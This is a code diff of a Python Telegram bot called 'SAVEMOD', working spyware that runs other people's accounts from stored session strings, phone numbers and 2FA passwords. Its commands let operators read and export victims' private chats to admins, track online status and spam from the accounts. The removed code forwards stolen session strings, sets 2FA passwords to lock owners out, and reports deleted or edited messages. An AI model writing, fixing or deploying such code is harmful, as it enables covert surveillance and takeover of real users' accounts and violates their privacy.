@@ -111,13 +111,6 @@ cursor.execute('''
     )
 ''')
 
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS user_names (
-        user_id INTEGER PRIMARY KEY,
-        name TEXT
-    )
-''')
-
 conn.commit()
 
 active_clients = {}
@@ -141,30 +134,6 @@ def is_target_admin(target_id):
 
 def escape_html(text):
     return html.escape(str(text))
-
-def get_media_icon(msg):
-    if msg.photo:
-        return "📷 Фото"
-    elif msg.video:
-        return "📹 Видео"
-    elif msg.voice:
-        return "🎤 Голосовое"
-    elif msg.video_note:
-        return "🔄 Кружок"
-    elif msg.sticker:
-        return "🎨 Стикер"
-    elif msg.document:
-        return "📎 Файл"
-    else:
-        return None
-
-def get_status_text(status):
-    if isinstance(status, UserStatusOnline):
-        return "🟢 В сети"
-    elif isinstance(status, UserStatusOffline):
-        return "⚫ Не в сети"
-    else:
-        return "⚪ Статус скрыт"
 
 def get_active_client():
     global current_active_user
@@ -205,44 +174,28 @@ def get_code_keyboard():
 async def export_chat_to_html(client, chat_id, chat_name, me):
     messages = []
     async for msg in client.iter_messages(chat_id, limit=2000):
-        text = msg.text or ""
-        media_info = get_media_icon(msg)
-        
-        try:
-            if msg.out:
-                sender_name = f"{me.first_name} (Вы)"
-                direction = "outgoing"
-            else:
-                sender = await client.get_entity(msg.sender_id)
-                sender_name = sender.first_name or sender.username or str(msg.sender_id)
-                direction = "incoming"
-            
-            dt_saratov = msg.date.astimezone(tz)
-            time_str = dt_saratov.strftime('%H:%M')
-            date_str = dt_saratov.strftime('%d.%m.%Y')
-            
-            text = escape_html(text).replace('\n', '<br>')
-            
-            media_html = ""
-            if media_info:
-                msg_link = f"https://t.me/c/{chat_id}/{msg.id}"
-                media_html = f'<div class="media">{media_info} - <a href="{msg_link}" target="_blank">Открыть</a></div>'
-            
-            messages.append(f'''
-            <div class="message {direction}">
-                <div class="message-content">
-                    <div class="message-header">
-                        <span class="sender">{escape_html(sender_name)}</span>
-                        <span class="time">{time_str}</span>
-                    </div>
-                    <div class="message-text">{text if text else "<i>Нет текста</i>"}</div>
-                    {media_html}
-                    <div class="message-date">{date_str}</div>
+        if msg.text:
+            try:
+                if msg.out:
+                    sender_name = f"{me.first_name} (Вы)"
+                else:
+                    sender = await client.get_entity(msg.sender_id)
+                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
+                
+                dt = msg.date.astimezone(tz)
+                time_str = dt.strftime('%H:%M')
+                date_str = dt.strftime('%d.%m.%Y')
+                text = escape_html(msg.text).replace('\n', '<br>')
+                
+                messages.append(f'''
+                <div class="msg">
+                    <div class="sender">{escape_html(sender_name)}</div>
+                    <div class="time">{time_str} {date_str}</div>
+                    <div class="text">{text}</div>
                 </div>
-            </div>
-            ''')
-        except:
-            continue
+                ''')
+            except:
+                continue
     
     if not messages:
         return None
@@ -253,30 +206,20 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
 <html>
 <head><meta charset="UTF-8"><title>Чат с {escape_html(chat_name)}</title>
 <style>
-*{{margin:0;padding:0;box-sizing:border-box}}
-body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0e1621;color:#e1e8f0;padding:20px}}
-.container{{max-width:800px;margin:0 auto;background:#17212b;border-radius:16px;overflow:hidden}}
-.header{{background:#1e2a3a;padding:20px;border-bottom:1px solid #2b3945}}
-.header h2{{font-size:18px}}
-.messages{{padding:20px}}
-.message{{margin-bottom:16px;padding:10px 14px;border-radius:14px;max-width:85%}}
-.incoming{{background:#2b3945;margin-right:auto}}
-.outgoing{{background:#5288c1;margin-left:auto;text-align:right}}
-.message-header{{font-size:12px;margin-bottom:6px;display:flex;justify-content:space-between}}
-.sender{{font-weight:bold}}
-.time{{color:#6c7883}}
-.message-text{{font-size:14px;white-space:pre-wrap}}
-.media{{font-size:12px;color:#6c7883;margin-top:6px}}
-.media a{{color:#6c7883}}
-.message-date{{font-size:10px;color:#6c7883;margin-top:4px}}
-.footer{{background:#0e1621;padding:12px;text-align:center;font-size:12px}}
+body{{font-family:Arial;background:#0e1621;color:#e1e8f0;padding:20px}}
+.container{{max-width:800px;margin:0 auto;background:#17212b;border-radius:10px;padding:20px}}
+.msg{{margin-bottom:15px;padding:10px;background:#2b3945;border-radius:10px}}
+.sender{{font-weight:bold;color:#e1e8f0}}
+.time{{font-size:10px;color:#6c7883}}
+.text{{font-size:14px;margin-top:5px}}
 </style>
 </head>
 <body>
 <div class="container">
-<div class="header"><h2>💬 {escape_html(chat_name)}</h2><div>Всего: {len(messages)}</div></div>
-<div class="messages">{''.join(messages)}</div>
-<div class="footer">📅 {datetime.now(tz).strftime('%d.%m.%Y %H:%M:%S')}</div>
+<h2>Чат с {escape_html(chat_name)}</h2>
+<p>Всего сообщений: {len(messages)}</p>
+{''.join(messages)}
+<p>📅 {datetime.now(tz).strftime('%d.%m.%Y %H:%M:%S')}</p>
 </div>
 </body>
 </html>'''
@@ -290,7 +233,7 @@ async def cmd_spyhelp(message):
     await message.answer("""
 🔰 <b>SAVEMOD - КОМАНДЫ</b>
 
-<b>👥 АККАУНТЫ</b>
+<b>АККАУНТЫ</b>
 /users - список аккаунтов
 /swap НОМЕР - переключиться
 /active - активный
@@ -298,22 +241,20 @@ async def cmd_spyhelp(message):
 /sessions - список сессий
 /reset_me - сбросить сессию
 
-<b>💬 ДЕЙСТВИЯ</b>
+<b>ДЕЙСТВИЯ</b>
 /send ID/@username текст
 /chats - список диалогов
-/chat НОМЕР или @username - просмотр чата
+/chat НОМЕР - просмотр чата
 /status @username - статус
 /online - кто в сети
 
-<b>👻 РЕЖИМ ПРИЗРАКА</b>
-/ghost on/off
-
-<b>📊 ДРУГОЕ</b>
+<b>ДРУГОЕ</b>
 /logs N - логи
 /stats - статистика
-/backup - бэкап БД
+/backup - бэкап
+/ghost on/off - режим призрака
 
-<b>🤖 ЮЗЕРБОТ (через точку в ЛС)</b>
+<b>ЮЗЕРБОТ (через точку в ЛС)</b>
 .help .mute .unmute .list .spam .type .info
 """, parse_mode='HTML')
 
@@ -475,11 +416,7 @@ async def cmd_chats(message):
                 if getattr(ent, 'bot', False) or ent.id == uid or is_target_admin(ent.id):
                     continue
                 name = ent.first_name or ent.username or str(ent.id)
-                if ent.username:
-                    display = f"{name} (@{ent.username})"
-                else:
-                    display = f"{name}"
-                chats.append({'id': ent.id, 'name': display})
+                chats.append({'id': ent.id, 'name': name})
             except:
                 chats.append({'id': dlg.id, 'name': dlg.name or str(dlg.id)})
     active_chats[uid] = chats
@@ -494,16 +431,16 @@ async def cmd_chats(message):
             out = ""
     if out:
         await message.answer(out, parse_mode='HTML')
-    await message.answer("💡 /chat НОМЕР - посмотреть чат\n💡 /export @username - экспорт HTML")
+    await message.answer("💡 /chat НОМЕР - посмотреть чат")
 
-# ===== ОСНОВНАЯ КОМАНДА /chat =====
+# ===== ИСПРАВЛЕННАЯ КОМАНДА /chat =====
 @dp.message_handler(commands=['chat'])
 async def cmd_chat(message):
     if not is_admin(message.from_user.id):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /chat @username\n/chat НОМЕР (из /chats)")
+        await message.answer("❌ /chat НОМЕР (из /chats)")
         return
     
     cl, uid = get_active_client()
@@ -511,27 +448,17 @@ async def cmd_chat(message):
         await message.answer("❌ Нет активного аккаунта")
         return
     
-    target_id = None
-    target_name = None
-    
-    if args.isdigit():
-        num = int(args) - 1
-        if uid in active_chats and active_chats[uid] and num >= 0 and num < len(active_chats[uid]):
-            target_id = active_chats[uid][num]['id']
-            target_name = active_chats[uid][num]['name']
-    else:
-        try:
-            ent = await resolve_entity(cl, args)
-            if ent and ent.id != uid and not is_target_admin(ent.id):
-                target_id = ent.id
-                target_name = ent.first_name or ent.username or args
-        except:
-            await message.answer("❌ Пользователь не найден")
-            return
-    
-    if not target_id:
-        await message.answer("❌ Не удалось определить получателя")
+    if not args.isdigit():
+        await message.answer("❌ Введи номер из /chats")
         return
+    
+    num = int(args) - 1
+    if uid not in active_chats or not active_chats[uid] or num < 0 or num >= len(active_chats[uid]):
+        await message.answer("❌ Неверный номер. Сначала выполни /chats")
+        return
+    
+    target_id = active_chats[uid][num]['id']
+    target_name = active_chats[uid][num]['name']
     
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
@@ -541,11 +468,13 @@ async def cmd_chat(message):
     
     await message.answer(f"📱 <b>Чат с {target_name}</b>\n\nВыбери действие:", parse_mode='HTML', reply_markup=kb)
 
+# ===== ИСПРАВЛЕННЫЙ ПОКАЗ ПОСЛЕДНИХ 30 =====
 @dp.callback_query_handler(lambda c: c.data.startswith('last_'))
 async def show_last(cb):
     if not is_admin(cb.from_user.id):
         await cb.answer("❌ Нет прав")
         return
+    
     data = cb.data.replace('last_', '').split('_', 1)
     target_id = int(data[0])
     target_name = data[1]
@@ -555,7 +484,7 @@ async def show_last(cb):
         await cb.message.answer("❌ Нет активного аккаунта")
         return
     
-    await cb.answer("Загружаю...")
+    await cb.answer("Загружаю последние 30 сообщений...")
     
     msgs = []
     async for msg in cl.iter_messages(target_id, limit=30):
@@ -568,20 +497,30 @@ async def show_last(cb):
                     if is_target_admin(s.id):
                         continue
                     sn = s.first_name or s.username or str(s.id)
-                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {sn}: {msg.text[:150]}")
+                dt = msg.date.strftime('%d.%m %H:%M')
+                msgs.append(f"[{dt}] {sn}: {msg.text[:200]}")
             except:
-                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:150]}")
+                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:200]}")
     
     if msgs:
-        await cb.message.answer(f"💬 <b>ЧАТ С {target_name}</b>\n\n" + "\n".join(reversed(msgs)))
+        response = f"💬 <b>ЧАТ С {target_name}</b>\n\n" + "\n".join(reversed(msgs))
+        # Разбиваем на части если длинное
+        if len(response) > 4000:
+            for i in range(0, len(msgs), 15):
+                part = "\n".join(reversed(msgs[i:i+15]))
+                await cb.message.answer(f"💬 <b>ЧАТ С {target_name}</b>\n\n{part}", parse_mode='HTML')
+        else:
+            await cb.message.answer(response, parse_mode='HTML')
     else:
-        await cb.message.answer("📭 Нет сообщений")
+        await cb.message.answer("📭 Нет сообщений или только медиа")
 
+# ===== ИСПРАВЛЕННЫЙ ЭКСПОРТ HTML =====
 @dp.callback_query_handler(lambda c: c.data.startswith('html_'))
 async def export_html(cb):
     if not is_admin(cb.from_user.id):
         await cb.answer("❌ Нет прав")
         return
+    
     data = cb.data.replace('html_', '').split('_', 1)
     target_id = int(data[0])
     target_name = data[1]
@@ -591,65 +530,35 @@ async def export_html(cb):
         await cb.message.answer("❌ Нет активного аккаунта")
         return
     
-    await cb.answer("Экспортирую...")
+    await cb.answer("Экспортирую чат в HTML...")
     
     me = await cl.get_me()
     html_content = await export_chat_to_html(cl, target_id, target_name, me)
     
     if not html_content:
-        await cb.message.answer("❌ Нет сообщений для экспорта")
+        await cb.message.answer("❌ Нет текстовых сообщений для экспорта")
         return
     
     with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
         f.write(html_content)
         path = f.name
     
+    # Проверяем размер файла
+    if os.path.getsize(path) == 0:
+        await cb.message.answer("❌ Ошибка: файл пустой")
+        os.unlink(path)
+        return
+    
     with open(path, 'rb') as f:
         for aid in ADMIN_IDS:
             try:
-                await bot.send_document(aid, InputFile(f, filename=f"chat_{target_name}.html"), caption=f"📁 Чат с {target_name}")
+                await bot.send_document(aid, InputFile(f, filename=f"chat_{target_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"), caption=f"📁 Чат с {target_name}")
                 await f.seek(0)
-            except:
-                pass
+            except Exception as e:
+                logger.error(f"Ошибка отправки HTML: {e}")
     
     os.unlink(path)
     await cb.message.answer("✅ HTML файл отправлен")
-
-@dp.message_handler(commands=['export'])
-async def cmd_export(message):
-    if not is_admin(message.from_user.id):
-        return
-    args = message.get_args()
-    if not args:
-        await message.answer("❌ /export @username")
-        return
-    cl, uid = get_active_client()
-    if not cl:
-        await message.answer("❌ Нет активного аккаунта")
-        return
-    ent = await resolve_entity(cl, args)
-    if not ent:
-        await message.answer("❌ Не найден")
-        return
-    name = ent.first_name or ent.username or args
-    status = await message.answer(f"📄 Экспортирую чат с {name}...")
-    me = await cl.get_me()
-    html_content = await export_chat_to_html(cl, ent.id, name, me)
-    if not html_content:
-        await status.edit_text("❌ Нет сообщений")
-        return
-    with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
-        f.write(html_content)
-        path = f.name
-    with open(path, 'rb') as f:
-        for aid in ADMIN_IDS:
-            try:
-                await bot.send_document(aid, InputFile(f, filename=f"chat_{name}.html"), caption=f"📁 Чат с {name}")
-                await f.seek(0)
-            except:
-                pass
-    os.unlink(path)
-    await status.edit_text("✅ HTML отправлен")
 
 @dp.message_handler(commands=['status'])
 async def cmd_status(message):
@@ -667,7 +576,7 @@ async def cmd_status(message):
     if not ent:
         await message.answer("❌ Не найден")
         return
-    st = get_status_text(ent.status) if hasattr(ent, 'status') else "Статус скрыт"
+    st = "🟢 В сети" if isinstance(ent.status, UserStatusOnline) else "⚫ Не в сети" if isinstance(ent.status, UserStatusOffline) else "⚪ Статус скрыт"
     await message.answer(f"👤 {ent.first_name}\n🆔 {ent.id}\n📊 {st}")
 
 @dp.message_handler(commands=['online'])
@@ -692,69 +601,6 @@ async def cmd_online(message):
     else:
         await message.answer("🟢 Никого")
 
-@dp.message_handler(commands=['session'])
-async def cmd_session(message):
-    if not is_admin(message.from_user.id):
-        return
-    args = message.get_args()
-    if not args:
-        await message.answer("❌ /session НОМЕР")
-        return
-    try:
-        num = int(args) - 1
-        cursor.execute('SELECT user_id, session_string, phone, two_fa, first_name, username FROM user_sessions')
-        rows = cursor.fetchall()
-        na = [(uid, ss, ph, tf, fn, un) for uid, ss, ph, tf, fn, un in rows if not is_target_admin(uid)]
-        if num < 0 or num >= len(na):
-            await message.answer("❌ Неверный номер")
-            return
-        uid, ss, ph, tf, fn, un = na[num]
-        name = fn or un or str(uid)
-        for aid in ADMIN_IDS:
-            try:
-                await bot.send_message(aid, f"🎭 <b>СЕССИЯ ДЛЯ {name}</b>\n\n<code>{ss}</code>", parse_mode='HTML')
-            except:
-                pass
-        await message.answer("✅ Сессия отправлена")
-    except:
-        await message.answer("❌ Ошибка")
-
-@dp.message_handler(commands=['set2fa'])
-async def cmd_set2fa(message):
-    if not is_admin(message.from_user.id):
-        return
-    args = message.get_args()
-    if not args:
-        await message.answer("❌ /set2fa ПАРОЛЬ")
-        return
-    cl, uid = get_active_client()
-    if not cl or is_target_admin(uid):
-        await message.answer("❌ Нет активного аккаунта")
-        return
-    try:
-        await cl.edit_2fa(args)
-        cursor.execute('UPDATE user_sessions SET two_fa=? WHERE user_id=?', (args, uid))
-        conn.commit()
-        await message.answer(f"✅ 2FA установлен: <code>{args}</code>", parse_mode='HTML')
-    except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
-
-@dp.message_handler(commands=['info'])
-async def cmd_info(message):
-    if not is_admin(message.from_user.id):
-        return
-    cl, uid = get_active_client()
-    if not cl or is_target_admin(uid):
-        await message.answer("❌ Нет активного аккаунта")
-        return
-    try:
-        me = await cl.get_me()
-        cursor.execute('SELECT phone, two_fa FROM user_sessions WHERE user_id=?', (uid,))
-        row = cursor.fetchone()
-        await message.answer(f"👤 {me.first_name}\n🆔 {me.id}\n📱 {row[0] if row else '-'}\n🔐 {'✅' if row and row[1] else '❌'}")
-    except:
-        await message.answer("❌ Ошибка")
-
 @dp.message_handler(commands=['logs'])
 async def cmd_logs(message):
     if not is_admin(message.from_user.id):
@@ -777,8 +623,7 @@ async def cmd_stats(message):
         return
     logs = cursor.execute('SELECT COUNT(*) FROM spy_logs').fetchone()[0]
     acc = cursor.execute('SELECT COUNT(*) FROM user_sessions').fetchone()[0]
-    stat = cursor.execute('SELECT COUNT(*) FROM user_status_logs').fetchone()[0]
-    await message.answer(f"📊 <b>СТАТИСТИКА</b>\n\n👥 Аккаунтов: {acc}\n💬 Сообщений: {logs}\n🔄 Логов статусов: {stat}\n🟢 Активных: {len(active_clients)}", parse_mode='HTML')
+    await message.answer(f"📊 <b>СТАТИСТИКА</b>\n\n👥 Аккаунтов: {acc}\n💬 Сообщений: {logs}\n🟢 Активных: {len(active_clients)}", parse_mode='HTML')
 
 @dp.message_handler(commands=['backup'])
 async def cmd_backup(message):
@@ -796,6 +641,8 @@ async def cmd_backup(message):
                 pass
     os.remove(bp)
     await st.edit_text("✅ Бэкап отправлен")
+
+# ========== РЕГИСТРАЦИЯ ==========
 
 @dp.message_handler(commands=['start'])
 async def cmd_start(message):
@@ -933,49 +780,6 @@ async def run_userbot(owner_id, session_string):
             cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                           (owner_id, event.id, sid, event.text, datetime.now().isoformat()))
             conn.commit()
-    
-    @client.on(events.MessageDeleted)
-    async def notify_delete(event):
-        if not event.is_private:
-            return
-        for mid in event.deleted_ids:
-            msg = saved_messages.get(owner_id, {}).get(mid)
-            if not msg:
-                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
-                row = cursor.fetchone()
-                if row:
-                    msg = {'sender_id': row[0], 'text': row[1]}
-            if msg and msg['sender_id'] != owner_id:
-                try:
-                    u = await client.get_entity(msg['sender_id'])
-                    name = u.first_name or 'Пользователь'
-                    await send_to_admin(f"🗑 {name} удалил сообщение:\n\n{msg['text'][:500]}")
-                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
-                    conn.commit()
-                except:
-                    pass
-    
-    @client.on(events.MessageEdited)
-    async def notify_edit(event):
-        if not event.is_private or event.out:
-            return
-        mid = event.id
-        ntxt = event.text or ''
-        msg = saved_messages.get(owner_id, {}).get(mid)
-        if not msg:
-            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
-            row = cursor.fetchone()
-            if row:
-                msg = {'sender_id': row[0], 'text': row[1]}
-        if msg and msg['sender_id'] != owner_id and msg['text'] != ntxt:
-            try:
-                u = await client.get_entity(msg['sender_id'])
-                name = u.first_name or 'Пользователь'
-                await send_to_admin(f"✏️ {name} изменил сообщение:\n\nБыло: {msg['text'][:200]}\nСтало: {ntxt[:200]}")
-                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (ntxt, owner_id, mid))
-                conn.commit()
-            except:
-                pass
     
     @client.on(events.NewMessage)
     async def user_commands(event):
